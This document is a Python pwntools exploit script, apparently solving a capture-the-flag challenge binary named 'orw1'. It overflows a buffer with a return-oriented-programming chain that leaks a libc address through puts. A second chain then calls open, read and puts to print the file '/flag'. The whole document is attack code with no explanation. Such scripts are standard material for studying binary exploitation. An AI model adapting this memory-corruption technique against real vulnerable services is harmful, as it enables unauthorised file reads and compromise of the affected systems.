from pwn import *
context.log_level = 'debug'
sh = process('./orw1')
elf = ELF('./orw1')
libc = elf.libc
gdb.attach(sh)
pause()
pop_rdi = 0x0000000000400af3
pop_rdx_rsi = 0x0000000000130569
payload = '\x00' * 0x118 + p64(pop_rdi) + p64(0x601030) + p64(0x00000000004007e0) + p64(0x0000000000400988)
payload = payload.ljust(0x950, '\x00')
sh.recvuntil('please input content\n')
sh.send(payload)
libc_base = u64(sh.recvn(6).ljust(8, '\x00')) - libc.sym['puts']
pop_rdx_rsi = libc_base + pop_rdx_rsi
open_addr = libc_base + libc.sym['open']
read_addr = 0x0000000000400810
puts_addr = 0x00000000004007e0
payload = '\x00' * 0x118 + p64(pop_rdi) + p64(0) + p64(pop_rdx_rsi) + p64(0x100)
payload += p64(0x0000000000601100) + p64(read_addr)
payload += p64(pop_rdi) + p64(0x601100) + p64(pop_rdx_rsi) + p64(0) + p64(0) + p64(open_addr)
payload += p64(pop_rdi) + p64(3) + p64(pop_rdx_rsi) + p64(0x100)
payload += p64(0x0000000000601100) + p64(read_addr)
payload += p64(pop_rdi) + p64(0x601100) + p64(puts_addr)
print(hex(libc_base))
payload = payload.ljust(0x950, '\x00')
sh.recvuntil('please input content\n')
sh.send(payload)
sh.send('/flag')
sh.interactive()
